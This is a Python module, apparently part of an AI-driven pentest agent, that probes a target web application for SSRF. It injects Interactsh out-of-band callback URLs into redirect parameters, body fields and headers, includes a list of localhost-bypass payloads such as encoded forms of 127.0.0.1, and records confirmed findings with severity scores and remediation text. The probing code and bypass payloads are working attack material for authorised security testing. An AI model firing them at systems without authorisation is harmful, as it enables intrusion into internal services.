"""
Tool 9 — test_ssrf_oob

True OOB SSRF testing using Interactsh.
ONLY OOB DNS/HTTP callback = confirmed SSRF.
Error page string matching = NOT SSRF (anti-pattern from v1).
"""

from __future__ import annotations

import asyncio
import re
import urllib.parse
from typing import Optional

import httpx
from loguru import logger

from cyberAI.llm.agent.state import RunState


_REDIRECT_PARAMS = ("to", "url", "redirect", "next", "dest", "target",
                    "return", "redirect_uri", "returnurl", "callback", "goto",
                    "forward", "location", "link", "href", "src", "image", "img")

_SSRF_BODY_FIELDS = ("url", "image", "imageUrl", "avatar", "webhook",
                     "callback", "endpoint", "target", "uri", "link", "src")

_SSRF_HEADERS = ("X-Forwarded-For", "Referer", "X-Real-IP", "Host",
                 "Origin", "X-Forwarded-Host")

_LOCALHOST_BYPASS_PAYLOADS = [
    "http://127.0.0.1",
    "http://[::1]",
    "http://0x7f000001",
    "http://017700000001",
    "http://2130706433",
    "http://localhost",
    "http://0",
]


def _build_injection_points(endpoints: list[dict], target_url: str) -> list[dict]:
    """Build candidate injection points from discovered endpoints."""
    base = target_url.rstrip("/")
    points: list[dict] = []
    seen: set[str] = set()

    for ep in endpoints:
        path = ep.get("path", "")
        method = (ep.get("methods") or ["GET"])[0]

        # Check if path has URL-like query params
        parsed = urllib.parse.urlparse(path)
        for param in _REDIRECT_PARAMS:
            if param in path.lower() or f"?{param}=" in path.lower():
                key = f"qp:{path}:{param}"
                if key not in seen:
                    points.append({
                        "type": "query_param",
                        "endpoint": path,
                        "param": param,
                        "method": "GET",
                    })
                    seen.add(key)

        # Check for URL params in body endpoints
        if method in ("POST", "PUT", "PATCH"):
            for field in _SSRF_BODY_FIELDS:
                if any(field.lower() in str(ep.get("params", [])).lower()
                       for _ in [1]):
                    key = f"bf:{path}:{field}"
                    if key not in seen:
                        points.append({
                            "type": "body_field",
                            "endpoint": path,
                            "field": field,
                            "method": method,
                        })
                        seen.add(key)

    # Always add common redirect paths
    for path in ("/redirect", "/api/redirect", "/redirect?to=", "/external"):
        for param in ("to", "url", "next"):
            key = f"common:{path}:{param}"
            if key not in seen:
                points.append({
                    "type": "query_param",
                    "endpoint": path.split("?")[0],
                    "param": param,
                    "method": "GET",
                })
                seen.add(key)
                break

    # Request headers
    for header in _SSRF_HEADERS[:4]:
        points.append({
            "type": "header",
            "header": header,
            "endpoint": "/",
            "method": "GET",
        })

    return points[:50]


async def _send_with_oob_injection(
    client: httpx.AsyncClient,
    base: str,
    point: dict,
    callback_url: str,
    jwt: Optional[str] = None,
) -> Optional[httpx.Response]:
    """Send a request with the OOB callback URL injected."""
    path = point.get("endpoint", "/")
    method = point.get("method", "GET").upper()
    headers: dict = {"Content-Type": "application/json"}
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"

    try:
        if point["type"] == "query_param":
            param = point["param"]
            url = f"{base}{path}?{param}={urllib.parse.quote(callback_url, safe='')}"
            r = await client.request(method, url, headers=headers, follow_redirects=False)
            return r

        elif point["type"] == "body_field":
            field = point["field"]
            r = await client.request(method, path, json={field: callback_url}, headers=headers)
            return r

        elif point["type"] == "header":
            header = point["header"]
            headers[header] = callback_url
            r = await client.request(method, f"{base}{path}", headers=headers)
            return r

    except Exception as e:
        logger.debug(f"ssrf probe error: {e}")
    return None


async def test_ssrf_oob(
    target_url: str,
    injection_points: Optional[list[dict]] = None,
    interactsh_server: str = "oast.me",
    session_name: str = "user_a",
    run_id: str = "",
    state: Optional[RunState] = None,
    oob_manager=None,
) -> dict:
    """
    True OOB SSRF testing. Only OOB interactions count as evidence.

    Returns:
    {
      "oob_interactions": [...],
      "tested_points": 34,
      "confirmed_count": 1
    }
    """
    base = target_url.rstrip("/")

    # Get session JWT
    jwt: Optional[str] = None
    if session_name and state:
        sess = state.get_sessions().get(session_name, {})
        jwt = sess.get("jwt")

    # Check OOB availability
    oob_available = oob_manager is not None and getattr(oob_manager, "is_available", False)
    if not oob_available:
        logger.info("test_ssrf_oob: Interactsh not available — running reflection-only check")
        # Still run injection attempts for reflection detection
        return await _run_reflection_check(base, injection_points or [], jwt, state)

    # Build injection points if not provided
    if not injection_points:
        endpoints = state.get_endpoints() if state else []
        injection_points = _build_injection_points(endpoints, base)

    confirmed_interactions = []
    tested = 0

    async with httpx.AsyncClient(base_url=base, timeout=15.0, verify=False) as client:
        for point in injection_points:
            # Generate unique OOB URL for this specific test
            correlation = f"ssrf_{point.get('type')}_{point.get('endpoint', '').replace('/', '_')}"
            callback_url = oob_manager.generate_url(correlation)
            if not callback_url:
                continue

            unique_id = callback_url.split(".")[0].replace("http://", "")

            # Send the injection
            resp = await _send_with_oob_injection(client, base, point, callback_url, jwt)
            tested += 1

            # Wait for OOB interaction
            await asyncio.sleep(2.0)
            hits = await oob_manager.wait_for_interaction(unique_id, timeout=5.0)

            if hits:
                for hit in hits:
                    interaction = {
                        "injection_point": f"{point.get('method', 'GET')} {point.get('endpoint', '/')}?{point.get('param', point.get('field', point.get('header', '')))}=",
                        "payload": callback_url,
                        "interaction_type": hit.interaction_type,
                        "source_ip": hit.source_ip,
                        "timestamp": hit.timestamp,
                        "confirmed_ssrf": True,
                        "severity": "critical" if hit.interaction_type == "http" else "high",
                    }
                    confirmed_interactions.append(interaction)

                    # Store finding
                    if state:
                        finding = {
                            "type": "SSRF",
                            "subtype": "oob_" + hit.interaction_type,
                            "title": f"Server-Side Request Forgery via {point.get('type')} {point.get('endpoint', '/')}",
                            "endpoint": point.get("endpoint", "/"),
                            "method": point.get("method", "GET"),
                            "severity": interaction["severity"],
                            "cvss_score": 9.8 if hit.interaction_type == "http" else 8.6,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            "owasp_category": "A10:2021 SSRF",
                            "cwe_id": "CWE-918",
                            "status": "confirmed",
                            "reproduction_count": 1,
                            "evidence": {
                                "injection_point": interaction["injection_point"],
                                "payload": callback_url,
                                "oob_interactions": [
                                    {
                                        "type": hit.interaction_type,
                                        "source_ip": hit.source_ip,
                                        "timestamp": hit.timestamp,
                                    }
                                ],
                                "confirmation_method": "oob_interactsh",
                            },
                            "remediation": (
                                "Validate and whitelist allowed URL schemes/hosts. "
                                "Use a URL allowlist. Block requests to internal IP ranges (RFC 1918). "
                                "Disable URL redirects that fetch external resources."
                            ),
                            "run_id": run_id,
                            "target": base,
                        }
                        state.add_finding(finding)
                        state.write_log("test", "WARNING", "test_ssrf_oob",
                                        f"CONFIRMED SSRF via {interaction['injection_point']}")

                    logger.warning(f"test_ssrf_oob: CONFIRMED {hit.interaction_type} interaction from {hit.source_ip}")

    return {
        "oob_interactions": confirmed_interactions,
        "tested_points": tested,
        "confirmed_count": len(confirmed_interactions),
        "oob_available": True,
    }


async def _run_reflection_check(
    base: str,
    injection_points: list[dict],
    jwt: Optional[str],
    state: Optional[RunState],
) -> dict:
    """
    Fallback when Interactsh is unavailable.
    Check for SSRF reflection (URL echoed back in response).
    NOTE: Reflection ≠ SSRF. These findings are marked as 'unverified'.
    """
    reflection_findings = []
    tested = 0
    probe_value = "http://ssrf-probe-cyberhunt.invalid/test"

    if not injection_points:
        endpoints = state.get_endpoints() if state else []
        injection_points = _build_injection_points(endpoints, base)

    async with httpx.AsyncClient(base_url=base, timeout=10.0, verify=False) as client:
        for point in injection_points[:20]:
            resp = await _send_with_oob_injection(client, base, point, probe_value, jwt)
            tested += 1
            if resp and probe_value in (resp.text or ""):
                reflection_findings.append({
                    "injection_point": point.get("endpoint", "/"),
                    "type": "reflection_only",
                    "note": "URL reflected in response — requires OOB verification to confirm SSRF",
                    "confirmed_ssrf": False,
                })

    return {
        "oob_interactions": [],
        "reflection_candidates": reflection_findings,
        "tested_points": tested,
        "confirmed_count": 0,
        "oob_available": False,
        "note": "Install interactsh-client for OOB SSRF verification",
    }
